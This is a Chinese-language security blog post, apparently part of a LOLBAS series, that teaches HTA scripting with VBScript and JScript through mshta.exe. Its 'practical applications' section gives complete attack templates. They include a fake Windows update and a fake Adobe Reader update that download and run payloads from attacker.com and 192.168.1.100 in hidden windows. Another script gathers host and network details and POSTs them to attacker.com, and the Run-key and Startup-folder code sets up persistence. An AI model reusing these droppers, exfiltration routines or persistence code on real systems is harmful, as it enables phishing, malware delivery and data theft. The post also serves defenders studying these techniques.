---
title: "LOLBAS鐵人賽Day28附錄（二）：HTA 基礎語法與實戰應用"
published: 2025-10-12T04:35:45.000Z
description: "LOLBAS 系列第 28 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

在之前 mshta.exe 的文章中，  
我們有看到 HTA 檔案也可以當作攻擊的方式，  
今天我們就來一起看看 HTA 的相關語法和技術應用吧！

## 一HTA 基礎

* * *

HTA (HTML Application) 是以 HTML 形式呈現但具有完整系統權限的應用程式，  
由 `mshta.exe` 執行跟網頁比較不同的地方是 HTA 不會受瀏覽器沙箱限制，  
可以執行系統命令存取檔案操作註冊表

### 基本結構

```html
<!DOCTYPE html>
<html>
<head>
    <title>我的 HTA</title>
    <HTA:APPLICATION 
        BORDER="thin"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
    />
</head>
<body>
    <h1>Hello HTA!</h1>
    <button onclick="alert('測試')">點我</button>
</body>
</html>

```

**說明：**

*   儲存為 `.hta` 副檔名，雙擊即可執行
*   `<HTA:APPLICATION>` 標籤設定視窗外觀
*   可以使用 HTML/CSS 設計介面
*   可以執行 VBScript 或 JScript

### 常用屬性

```html
<HTA:APPLICATION 
    BORDER="thin"           <!-- 邊框樣式 -->
    CAPTION="yes"           <!-- 顯示標題列 -->
    MAXIMIZEBUTTON="yes"    <!-- 最大化按鈕 -->
    MINIMIZEBUTTON="yes"    <!-- 最小化按鈕 -->
    SHOWINTASKBAR="no"      <!-- 不顯示在工作列 -->
    SINGLEINSTANCE="yes"    <!-- 只能執行一個 -->
    WINDOWSTATE="normal"    <!-- 視窗狀態 -->
/>

```

**說明：**

*   `SHOWINTASKBAR="no"` 可以隱藏視窗，常用於隱密執行
*   `SINGLEINSTANCE="yes"` 防止重複執行
*   `BORDER="none"` 可以建立無邊框視窗

## 二VBScript 核心語法

* * *

### 基本語法

```vbscript
<script language="VBScript">
' 變數與常數
Dim name, age
name = "John"
age = 30
Const PI = 3.14

' 陣列
Dim items
items = Array("A", "B", "C")

' 條件判斷
If age >= 18 Then
    MsgBox "成年"
Else
    MsgBox "未成年"
End If

' 迴圈
Dim i
For i = 1 To 5
    document.write i & "<br>"
Next
</script>

```

**說明：**

*   VBScript 不區分大小寫
*   使用 `Dim` 宣告變數，不需指定型別
*   `Array()` 快速建立陣列
*   `&` 用於字串連接
*   `document.write` 可以輸出到網頁上

### 檔案操作

```vbscript
<script language="VBScript">
Sub FileExample()
    Dim fso, file
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' 寫入檔案
    Set file = fso.CreateTextFile("C:\test.txt", True)
    file.WriteLine "測試內容"
    file.Close
    
    ' 讀取檔案
    If fso.FileExists("C:\test.txt") Then
        Set file = fso.OpenTextFile("C:\test.txt", 1)
        Dim content
        content = file.ReadAll
        file.Close
        MsgBox content
    End If
End Sub
</script>

```

**說明：**

*   `CreateObject("Scripting.FileSystemObject")` 建立檔案系統物件
*   `CreateTextFile` 建立新檔案（第二個參數 True 表示覆寫）
*   `OpenTextFile` 開啟檔案（1=唯讀，2=寫入，8=附加）
*   `FileExists` 檢查檔案是否存在
*   可以用來讀寫設定檔記錄日誌等

### 執行命令

```vbscript
<script language="VBScript">
Sub RunCommand()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    
    ' 顯示視窗執行
    shell.Run "cmd.exe /c ipconfig", 1, True
    
    ' 背景執行（隱藏視窗）
    shell.Run "notepad.exe", 0, False
    
    ' 執行 PowerShell
    shell.Run "powershell.exe -Command Get-Process", 1, False
    
    ' 取得環境變數
    MsgBox "電腦名稱: " & shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
End Sub
</script>

```

**說明：**

*   `CreateObject("WScript.Shell")` 建立 Shell 物件用來執行命令
*   `Run` 方法的三個參數：命令視窗狀態（0=隱藏，1=顯示）是否等待
*   `cmd.exe /c` 執行命令後自動關閉
*   `ExpandEnvironmentStrings` 展開環境變數（如 %TEMP%, %USERNAME%）
*   第三個參數 True 會等待命令執行完成

### 網路操作

```vbscript
<script language="VBScript">
Sub DownloadFile()
    Dim http, stream
    Set http = CreateObject("MSXML2.XMLHTTP")
    Set stream = CreateObject("ADODB.Stream")
    
    ' 下載檔案
    http.Open "GET", "http://example.com/file.txt", False
    http.Send
    
    If http.Status = 200 Then
        stream.Type = 1  ' Binary
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile "C:\downloaded.txt", 2
        stream.Close
        MsgBox "下載完成"
    End If
End Sub

Sub SendData()
    Dim http
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' POST 請求
    http.Open "POST", "http://example.com/api", False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send "data=hello"
    
    MsgBox http.ResponseText
End Sub
</script>

```

**說明：**

*   `MSXML2.XMLHTTP` 用來發送 HTTP 請求
*   `ADODB.Stream` 用來處理二進位資料
*   `Status = 200` 表示請求成功
*   `SaveToFile` 的第二個參數：1=不覆寫，2=覆寫
*   可以用來下載第二階段 payload 或上傳資料到 C&C 伺服器

## 三JScript 核心語法

* * *

### 基本語法

```javascript
<script language="JScript">
// 變數和函數
var name = "John";
var age = 30;

function greet(name) {
    return "Hello, " + name;
}

// 陣列
var arr = [1, 2, 3, 4, 5];
arr.push(6);
var str = arr.join(",");

// 物件
var person = {
    name: "John",
    age: 30
};

// 迴圈
for (var i = 0; i < 5; i++) {
    document.write(i + "<br>");
}
</script>

```

**說明：**

*   JScript 是 Microsoft 的 JavaScript 實作
*   語法與 JavaScript 相似
*   支援物件導向程式設計
*   可以與 VBScript 混用

### 系統操作

```javascript
<script language="JScript">
function executeCommand(cmd) {
    var shell = new ActiveXObject("WScript.Shell");
    var exec = shell.Exec(cmd);
    
    var output = "";
    while (!exec.StdOut.AtEndOfStream) {
        output += exec.StdOut.ReadLine() + "\n";
    }
    return output;
}

function downloadAndRun(url, savePath) {
    var http = new ActiveXObject("MSXML2.XMLHTTP");
    var stream = new ActiveXObject("ADODB.Stream");
    var shell = new ActiveXObject("WScript.Shell");
    
    http.open("GET", url, false);
    http.send();
    
    if (http.status == 200) {
        stream.type = 1;
        stream.open();
        stream.write(http.responseBody);
        stream.saveToFile(savePath, 2);
        stream.close();
        
        shell.Run(savePath, 0, false);
        return true;
    }
    return false;
}
</script>

```

**說明：**

*   `ActiveXObject` 建立 COM 物件
*   `Exec` 執行命令並可以讀取輸出
*   `StdOut.ReadLine()` 讀取命令的標準輸出
*   這個函數可以執行命令並取得結果
*   常用於下載並執行遠端的惡意程式

## 四實戰應用

* * *

### 1\. 偽裝更新通知

```html
<!DOCTYPE html>
<html>
<head>
    <title>系統更新</title>
    <HTA:APPLICATION 
        BORDER="dialog"
        CAPTION="yes"
        SHOWINTASKBAR="no"
    />
    <style>
        body { font-family: Arial; padding: 30px; }
        .warning { color: red; font-weight: bold; }
        button { background: #0078d4; color: white; 
                 padding: 10px 30px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Windows 安全更新</h2>
    <p class="warning">發現重要安全漏洞</p>
    <p>請立即安裝更新以保護您的電腦</p>
    <button onclick="Install()">立即安裝</button>
    <button onclick="window.close()">稍後提醒</button>
    
    <script language="VBScript">
    Sub Install()
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell.exe -w hidden IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')", 0, False
        MsgBox "更新完成", vbInformation
        window.close()
    End Sub
    </script>
</body>
</html>

```

**說明：**

*   使用 Windows 風格的 UI 提高可信度
*   `SHOWINTASKBAR="no"` 避免被發現
*   `-w hidden` 隱藏 PowerShell 視窗
*   `IEX` 是 `Invoke-Expression` 的別名，執行下載的腳本
*   這是典型的釣魚攻擊手法，偽裝成系統更新

### 2\. 資訊收集

```html
<script language="VBScript">
Sub CollectInfo()
    Dim shell, fso, file
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' 建立報告檔案
    Dim reportPath
    reportPath = shell.ExpandEnvironmentStrings("%TEMP%\report.txt")
    Set file = fso.CreateTextFile(reportPath, True)
    
    ' 收集基本資訊
    file.WriteLine "電腦: " & shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    file.WriteLine "使用者: " & shell.ExpandEnvironmentStrings("%USERNAME%")
    file.WriteLine "網域: " & shell.ExpandEnvironmentStrings("%USERDOMAIN%")
    
    ' 執行命令收集詳細資訊
    Dim exec
    Set exec = shell.Exec("cmd.exe /c ipconfig /all")
    file.WriteLine vbCrLf & "=== 網路設定 ===" & vbCrLf
    file.WriteLine exec.StdOut.ReadAll
    
    file.Close
    
    ' 上傳到遠端
    Call UploadFile(reportPath)
End Sub

Sub UploadFile(path)
    Dim http, fso, file, content
    Set http = CreateObject("MSXML2.XMLHTTP")
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.OpenTextFile(path, 1)
    content = file.ReadAll
    file.Close
    
    http.Open "POST", "http://attacker.com/upload", False
    http.Send content
End Sub
</script>

```

**說明：**

*   `%TEMP%` 是暫存目錄，通常不會被注意
*   `Exec` 執行命令並捕獲輸出
*   收集電腦名稱使用者名稱網路設定等資訊
*   可以用來進行偵察或建立目標資料庫

### 3\. 持久化機制

```html
<script language="VBScript">
Sub CreatePersistence()
    Dim shell, fso, htaPath
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' 取得當前 HTA 路徑
    htaPath = window.location.pathname
    htaPath = Mid(htaPath, 2)  ' 移除開頭的 /
    
    ' 方法一：複製到啟動資料夾
    Dim startupPath
    startupPath = shell.SpecialFolders("Startup")
    fso.CopyFile htaPath, startupPath & "\check.hta", True
    
    ' 方法二：寫入註冊表
    On Error Resume Next
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Check", _
                   """" & htaPath & """", "REG_SZ"
End Sub
</script>

```

**說明：**

*   `window.location.pathname` 取得目前 HTA 檔案的路徑
*   `SpecialFolders("Startup")` 取得啟動資料夾路徑
*   複製到啟動資料夾後，每次開機都會執行
*   寫入註冊表的 Run 鍵也會在開機時自動執行
*   `On Error Resume Next` 忽略錯誤（如權限不足）

### 4\. 完整攻擊範例

```html
<!DOCTYPE html>
<html>
<head>
    <title>Adobe Reader Update</title>
    <HTA:APPLICATION BORDER="dialog" SHOWINTASKBAR="no" />
</head>
<body>
    <h3>Adobe Reader 需要更新</h3>
    <button onclick="Update()">更新</button>
    
    <script language="VBScript">
    Sub Update()
        Dim shell, http, stream
        Set shell = CreateObject("WScript.Shell")
        Set http = CreateObject("MSXML2.XMLHTTP")
        Set stream = CreateObject("ADODB.Stream")
        
        ' 下載 payload
        http.Open "GET", "http://192.168.1.100/payload.exe", False
        http.Send
        
        If http.Status = 200 Then
            Dim exePath
            exePath = shell.ExpandEnvironmentStrings("%TEMP%\update.exe")
            
            stream.Type = 1
            stream.Open
            stream.Write http.ResponseBody
            stream.SaveToFile exePath, 2
            stream.Close
            
            ' 執行 payload
            shell.Run exePath, 0, False
            
            ' 建立持久化
            shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Adobe", _
                          """" & exePath & """", "REG_SZ"
        End If
        
        MsgBox "更新完成", vbInformation
        window.close()
    End Sub
    </script>
</body>
</html>

```

**說明：**

*   完整的攻擊流程：下載 執行 持久化
*   偽裝成 Adobe Reader 更新提高成功率
*   payload 儲存在 %TEMP% 目錄
*   透過註冊表實現開機自動啟動
*   實際攻擊中常見的手法

## 五測試環境

* * *

### 建立測試 HTA

```html
<!-- test.hta -->
<!DOCTYPE html>
<html>
<head>
    <title>測試</title>
    <HTA:APPLICATION />
</head>
<body>
    <button onclick="Test()">測試</button>
    <script language="VBScript">
    Sub Test()
        MsgBox "HTA 可以正常執行"
        
        Dim fso
        Set fso = CreateObject("Scripting.FileSystemObject")
        Dim file
        Set file = fso.CreateTextFile("C:\test.txt", True)
        file.WriteLine "測試成功"
        file.Close
        
        MsgBox "已建立 C:\test.txt"
    End Sub
    </script>
</body>
</html>

```

**說明：**

*   儲存為 `.hta` 檔案
*   雙擊執行測試
*   如果能建立檔案就表示有完整權限

## 六總結

* * *

### 核心技術

*   **VBScript/JScript**：腳本語言，控制 HTA 行為
*   **FileSystemObject**：檔案和目錄操作
*   **WScript.Shell**：執行命令和操作註冊表
*   **XMLHTTP**：網路請求，下載和上傳資料

### 常見用途

*   **釣魚攻擊**：偽裝成合法程式更新
*   **初始存取**：作為第一階段 dropper
*   **資訊收集**：收集系統資訊
*   **持久化**：透過啟動項或註冊表

### 參考資源

*   [Microsoft HTA Documentation](https://learn.microsoft.com/en-us/previous-versions/ms536495\(v=vs.85\))
*   [MITRE ATT&CK: T1218.005](https://attack.mitre.org/techniques/T1218/)
*   [LOLBAS Project: mshta.exe](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
*   [Computer Learning Zone: Microsoft HTA Tutorial](https://599cd.com/tips/hta/beginner/B1/)